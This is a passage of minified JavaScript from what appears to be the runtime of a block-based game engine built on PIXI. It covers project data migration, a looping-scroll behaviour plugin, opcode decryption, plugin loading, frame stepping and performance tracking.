                    return "Repeat" === t.id;
                }) < 0) && (c++, d.plugins.push({
                    id: "Repeat",
                    type: "behavior",
                    name: "循环滚动",
                    desc: "让精灵可以循环衔接滚动",
                    author: "",
                    version: 1,
                    properties: {
                        enable: {
                            value: !0
                        },
                        cloneCount: {
                            value: 1
                        },
                        cloneDirection: {
                            value: 3
                        },
                        autoMove: {
                            value: !1
                        },
                        speed: {
                            value: 5
                        },
                        speedDirection: {
                            value: 2
                        },
                        reset: {
                            value: !0
                        }
                    },
                    category: "behavior",
                    visible: !0
                }));
        }
        t.behaviors ? t.behaviors.Repeat = c : t.behaviors = {
            Repeat: c
        };
    }
    var g, f;
    if ((!t.version || t.version <= 15) && (g = t.sprites, f = t.components, Object.keys(f).forEach(function (n) {
        "container" === (n = f[n]).type && Object.keys(n.blocks).forEach(function (i) {
            i = n.blocks[i], Object.keys(i.fields).forEach(function (t) {
                var e;
                -1 < (t = i.fields[t]).value.indexOf("_children_") && (e = (e = t.value.replace("_children_", "")).split("&&")[0]) && f[e] && n.layers[0] && g[n.layers[0]] && (0 < (e = f[e].layers.filter(function (t) {
                    return g[n.layers[0]].children.includes(t);
                })).length ? t.value = "_children_" + e[0] : console.error("查找子元素出错", e, t));
            });
        });
    })), !t.version || t.version <= 17) {
        var m, y = t.meta.horizontal ? 667 : 375, _ = t.meta.horizontal ? 375 : 667, v = t.sprites, k = t.components;
        for (m in v) {
            var b = (I = v[m]).properties, x = k[I.origin], I = (b.backgroundColor && (b.alpha = b.backgroundColor.alpha,
                b.tint = b.backgroundColor.hex, "text" !== I.type ? delete b.backgroundColor : (delete b.tint,
                    b.alpha = 1)), "plugin" !== I.type && "container" !== I.type || (b.alpha = 1), b.height / 2), w = b.width / 2 || x.properties.width / 2, I = I || x.properties.height / 2;
            b.widgetModeV && (1 === b.widgetModeV ? (b.widgetV = Math.round(_ - b.y - I), b.y = Math.round(_ - b.widgetV - I)) : 2 === b.widgetModeV && (b.widgetV = Math.round(_ + b.y - I),
                b.y = Math.round(b.widgetV - _ + I))), b.widgetModeH && (1 === b.widgetModeH ? (b.widgetH = Math.round(y + b.x - w),
                    b.x = Math.round(b.widgetH - y + w)) : 2 === b.widgetModeH && (b.widgetH = Math.round(y - b.x - w),
                        b.x = Math.round(y - b.widgetH - w)));
        }
    }
    if (!t.version || t.version <= 13) {
        var C, S = t.components;
        for (C in t.layers) {
            var P = t.layers[C];
            P.parent && (P.parent = !1), P.origin && S[P.origin].layers.indexOf(P.id) < 0 && S[P.origin].layers.push(P.id);
        }
    }
    if (!t.version || t.version <= 14) for (var T in t.layers) "container" === (T = t.layers[T]).type && (T.properties.unequal = !0,
        T.properties.width || (T.properties.width = 750), T.properties.height || (T.properties.height = 1334));
    if (!t.version || t.version <= 17) {
        var O, E = t.meta.horizontal ? 667 : 375, B = t.meta.horizontal ? 375 : 667, R = t.components;
        for (O in t.layers) {
            var L = (A = t.layers[O]).properties, M = R[A.origin], A = (L.backgroundColor && (L.alpha = L.backgroundColor.alpha,
                L.tint = L.backgroundColor.hex, "text" !== A.type ? delete L.backgroundColor : (delete L.tint,
                    M.properties.plainText && (L.alpha = 1))), "plugin" !== A.type && "container" !== A.type || (L.alpha = 1),
                L.height / 2), D = L.width / 2 || M.properties.width / 2, A = A || M.properties.height / 2;
            L.widgetModeV && (1 === L.widgetModeV ? (L.widgetV = Math.round(B - L.y - A), L.y = Math.round(B - L.widgetV - A)) : 2 === L.widgetModeV && (L.widgetV = Math.round(B + L.y - A),
                L.y = Math.round(L.widgetV - B + A))), L.widgetModeH && (1 === L.widgetModeH ? (L.widgetH = Math.round(E + L.x - D),
                    L.x = Math.round(L.widgetH - E + D)) : 2 === L.widgetModeH && (L.widgetH = Math.round(E - L.x - D),
                        L.x = Math.round(E - L.widgetH - D)));
        }
    }
    return t;
}

function hasKey(t, e) {
    for (var i = 0; i < t.length; i++) if (t[i].id === e) return !0;
    return !1;
}

var MiscUtil = {
    clearArray: function (t) {
        t && 0 !== t.length && truncateArray(t, 0);
    }
};

function truncateArray(t, e) {
    t.length = e;
}

LB.Camera = Camera$1, LB.Util = Util, LB.MathUtil = MathUtil, LB.Timer = Timer,
    LB.ErrorHelper = ErrorHelper;

var isDevTool = !!isMiniGame && "devtools" !== wxSystemInfo.platform, devNum = isDevTool ? 1e3 : 1, VM = function () {
    function t() {
        classCallCheck(this, t), this._nextUid = 0, this._tickCount = 0, this.status = !0,
            this.eventEmitter = getEventEmitter(), this.eventEmitter.removeAllListeners(), this._lastUpdate = 0,
            this._frameTime = 0, this.isMiniGame = isMiniGame, this._allObjectClasses = [],
            this._objectClassesByName = new Map(), this._instancesByUid = new Map(), this._pluginInstanceToTick = new Set();
    }
    var s, i;
    return createClass(t, [{
        key: "getNextUid",
        value: function () {
            return this._nextUid++;
        }
    }, {
        key: "mapInstanceByUID",
        value: function (t, e) {
            this._instancesByUid.set(t, e);
        }
    }, {
        key: "_loadPluginScripts",
        value: (i = asyncToGenerator(_regeneratorRuntime__default.default.mark(function t(n, s) {
            var r, a, o, l, h;
            return _regeneratorRuntime__default.default.wrap(function (t) {
                for (; ;) switch (t.prev = t.next) {
                    case 0:
                        r = 0;

                    case 1:
                        if (!(r < n.length)) {
                            t.next = 11;
                            break;
                        }
                        if (a = n[r], LB.Behaviors[a]) {
                            t.next = 8;
                            break;
                        }
                        t.next = 6;
                        var e = "../behaviors/" + a.toLowerCase() + "/index";
                        return Promise.resolve().then(function () {
                            return _interopNamespace(require(e));
                        });

                    case 6:
                        h = t.sent, LB.Behaviors[a] = h.default;

                    case 8:
                        r++, t.next = 1;
                        break;

                    case 11:
                        o = 0;

                    case 12:
                        if (!(o < s.length)) {
                            t.next = 22;
                            break;
                        }
                        if (l = s[o].id, LB.Plugins[l]) {
                            t.next = 19;
                            break;
                        }
                        t.next = 17;
                        var i = "../plugins/" + l.toLowerCase() + "/index";
                        return Promise.resolve().then(function () {
                            return _interopNamespace(require(i));
                        });

                    case 17:
                        h = t.sent, LB.Plugins[l] = h.default;

                    case 19:
                        o++, t.next = 12;
                        break;

                    case 22:
                    case "end":
                        return t.stop();
                }
            }, t, this);
        })), function (t, e) {
            return i.apply(this, arguments);
        })
    }, {
        key: "_loadPluginScriptsByMiniGame",
        value: function (t, e) {
            for (var i = 0; i < t.length; i++) {
                var n, s = t[i];
                LB.Behaviors[s] || (n = require("./_behaviors/" + s.toLowerCase() + "/index"), LB.Behaviors[s] = n.default);
            }
            for (var r = 0; r < e.length; r++) {
                var a, o = e[r].id;
                LB.Plugins[o] || (a = require("./_plugins/" + o.toLowerCase() + "/index"), LB.Plugins[o] = a.default);
            }
        }
    }, {
        key: "getPluginManager",
        value: function () {
            return this._pluginManager;
        }
    }, {
        key: "decrypt",
        value: function (t) {
            var e, i, n, s, r = [];
            for (e in t.plugins.forEach(function (t) {
                r.push(t.id.toLowerCase());
            }), t.behaviors) r.push(e.toLowerCase());
            for (i in t.components) for (s in n = t.components[i].blocks) {
                var a = n[s];
                -1 === r.indexOf((a.opcode.split(".")[0] || "").toLowerCase()) && (a.opcode = decrypt(a.opcode, t.meta.id));
            }
            for (i in t.procedures) for (s in n = t.procedures[i].blocks) a = n[s], -1 === r.indexOf((a.opcode.split(".")[0] || "").toLowerCase()) && (a.opcode = decrypt(a.opcode, t.meta.id));
            return t;
        }
    }, {
        key: "init",
        value: (s = asyncToGenerator(_regeneratorRuntime__default.default.mark(function t(e, i, n, s) {
            var r;
            return _regeneratorRuntime__default.default.wrap(function (t) {
                for (; ;) switch (t.prev = t.next) {
                    case 0:
                        e._hasDecrypt || ((e = this.decrypt(e))._hasDecrypt = !0), s && (this.isMiniGame ? s : tranformCode)(e),
                            this.config = e, this._projectId = e.meta.id, e.is_codeModel = "1" == e.codeType || 1 == e.meta.code_type,
                            Config.horizontal = e.meta.horizontal, Config.isCodeMode = e.is_codeModel, Config.adaptationMode = e.meta.adaptationMode || 1,
                            LB.isDebug = !!e.meta.defaultDebug, i && (Config._width = i.width, Config._height = i.height,
                                Config.devicePixelRatio = 2), n && (Config._zoom = n), r = getDeviceInfo(), this.devicePixel = r.devicePixelRatio / 2,
                            this._lastUpdate = 0, this.isStageReady = !1, this._blockEngine = new EventBlockManager(this),
                            this._pluginManager = new PluginManager(this), this.renderer = App.getInstance(this),
                            this.inputManager = new InputManager(this.renderer), r = Object.keys(e.behaviors),
                            e.plugins = e.plugins || [], isMiniGame ? (this._loadPluginScriptsByMiniGame(r, e.plugins),
                                t.next = 27) : t.next = 25;
                        break;

                    case 25:
                        return t.next = 27, this._loadPluginScripts(r, e.plugins);

                    case 27:
                        this._installPluginsAfterLoadData(r, e.plugins), Config.isCodeMode || this.preInit(e);

                    case 29:
                    case "end":
                        return t.stop();
                }
            }, t, this);
        })), function (t, e, i, n) {
            return s.apply(this, arguments);
        })
    }, {
        key: "preInit",
        value: function (t) {
            this.config = t, Config.horizontal = t.meta.horizontal, this.pause = !1, this._blockEngine.registerHats(),
                this._blockEngine.registerBlockFunctions(), this._blockEngine.registerActions(),
                this._initObjectClass(t.plugins), this._initObjectClass(pluginSystemConfig), this.runtimeData = new RuntimeData(t, this),
                this.renderer.connect(this.runtimeData), this.bindEvent(), attachDOMEvent();
        }
    }, {
        key: "_initObjectClass",
        value: function (t) {
            var e = this;
            t.forEach(function (t) {
                t = t.id, t = new ObjectClass(e, LB.Plugins[t], {
                    name: t
                }), e._allObjectClasses.push(t), e._objectClassesByName.set(t.getName().toLowerCase(), t);
            });
        }
    }, {
        key: "bindEvent",
        value: function () {
            isMiniGame && bindEvents(this.runtimeData);
        }
    }, {
        key: "calculateFrameTime",
        value: function (t) {
            t = t || performance.now(), this._realFrameTime = (t - (this._lastUpdate || performance.now())) / 1e3 / devNum,
                this._frameTime = 1 / 60, (1 < this._frameTime || this._frameTime < 0) && (this._realFrameTime = 1 / 60),
                this._lastUpdate = t;
        }
    }, {
        key: "stepFrame",
        value: function () {
            !1 !== this.isStageReady && !1 !== this.status && (Performance.startPoint("everyFrame"),
                this.calculateFrameTime(), this.runtimeData && this.runtimeData.update(), Performance.newPointList("physic"),
                Performance.newPointList("collisionPolygon"), Performance.newPointList("collisionAABB_function"),
                Performance.newPointList("collisionAABB"), Performance.newPointList("collision_SAT"),
                Performance.newPointList("quadTree_test"), Performance.newPointList("quadTree_retrieve"),
                Performance.newPointList("build_quadTree"), Performance.newPointList("threadsDetails"),
                Performance.newPointList("makeClone"), this.config.is_codeModel && this.engine ? this.engine.update(this._frameTime) : (this._blockEngine.activeNewThread(),
                    Performance.startPoint("traverseThreads"), this._blockEngine.traverseThreads(),
                    Performance.endPoint("traverseThreads"), Performance.startPoint("PluginsTick"),
                    this._pluginTick(), this.eventEmitter.emit("tick", this._frameTime), Performance.endPoint("PluginsTick")),
                Performance.startPoint("rendererUpdate"), this.renderer.update(this._frameTime),
                Performance.endPoint("rendererUpdate"), this._tickCount++, Performance.endPoint("everyFrame"),
                Performance.addPerformanceInfoToList());
        }
    }, {
        key: "release",
        value: function () {
            removeDOMEvent(), this._pluginManager && this._pluginManager.release(), this._pluginManager = null,
                this._blockEngine && this._blockEngine.release(), this._blockEngine = null, this.inputManager && this.inputManager.release(),
                this.inputManager = null, this.runtimeData && this.runtimeData.dispose(), this.runtimeData = null,
                MiscUtil.clearArray(this._allObjectClasses), this._allObjectClasses = null, this._objectClassesByName && (this._objectClassesByName.clear(),
                    this._objectClassesByName = null), this._instancesByUid && (this._instancesByUid.clear(),
                        this._instancesByUid = null), this._pluginInstanceToTick && (this._pluginInstanceToTick.clear(),
                            this._pluginInstanceToTick = null);
        }
    }, {
        key: "reset",
        value: function (t) {
            this._pluginInstanceToTick && this._pluginInstanceToTick.clear(), this._blockEngine && this._blockEngine.stopAllThread(),
                this._physicsSystem && this._physicsSystem.clear(), this._pluginManager.reset(),
                this.runtimeData.reset(t);
        }
    }, {
        key: "destroy",
        value: function () {
            console.log("销毁VM"), this.release(), this.config = null, this.renderer && this.renderer.dispose(),
                this.renderer = null, this.engine && (this.engine.destroy(), this.engine = null),
                this.eventEmitter && (this.eventEmitter.removeAllListeners(), this.eventEmitter = null),
                Performance.print(), Performance.clear();
        }
    }, {
        key: "_installPluginsAfterLoadData",
        value: function (t, e) {
            var i = !0, n = !1, s = void 0;
            try {
                for (var r, a = pluginSystemConfig[Symbol.iterator](); !(i = (r = a.next()).done); i = !0) {
                    var o = r.value;
                    this._pluginManager.createSystemPlugin(o);
                }
            } catch (e) {
                n = !0, s = e;
            } finally {
                try {
                    !i && a.return && a.return();
                } finally {
                    if (n) throw s;
                }
            }
            var l = !0, n = !1, s = void 0;
            try {
                for (var h, u = t[Symbol.iterator](); !(l = (h = u.next()).done); l = !0) {
                    var c = h.value;
                    this._pluginManager.createBehavior(c);
                }
            } catch (e) {
                n = !0, s = e;
            } finally {
                try {
                    !l && u.return && u.return();
                } finally {
                    if (n) throw s;
                }
            }
            var p = !0, t = !1, n = void 0;
            try {
                for (var d, g = e[Symbol.iterator](); !(p = (d = g.next()).done); p = !0) {
                    var f = d.value;
                    this._pluginManager.createPlugin(f);
                }
            } catch (e) {
                t = !0, n = e;
            } finally {
                try {
                    !p && g.return && g.return();
                } finally {
                    if (t) throw n;
                }
            }
        }
    }, {
        key: "_pluginTick",
        value: function () {
            var t = !0, e = !1, i = void 0;
            try {
                for (var n, s = this._pluginInstanceToTick[Symbol.iterator](); !(t = (n = s.next()).done); t = !0) {
                    var r = n.value;
                    r._instance.sceneRenderer.config.isSleeping || r.tick(this._frameTime);
                }
            } catch (t) {
                e = !0, i = t;
            } finally {
                try {
                    !t && s.return && s.return();
                } finally {
                    if (e) throw i;
                }
            }
        }
    }, {
        key: "_addPluginInstanceToTick",
        value: function (t) {
            this._pluginInstanceToTick.add(t);
        }
    }, {
        key: "_removePluginInstanceToTick",
        value: function (t) {
            this._pluginInstanceToTick.delete(t);
        }
    }, {
        key: "_getProjectStorageKey",
        value: function () {
            return "___luban___storage__" + this._projectId;
        }
    }, {
        key: "tickCount",
        get: function () {
            return this._tickCount;
        }
    }, {
        key: "RenderEngine",
        get: function () {
            return PIXI__namespace;
        }
    }]), t;
}();

window.VM = VM, module.exports = VM;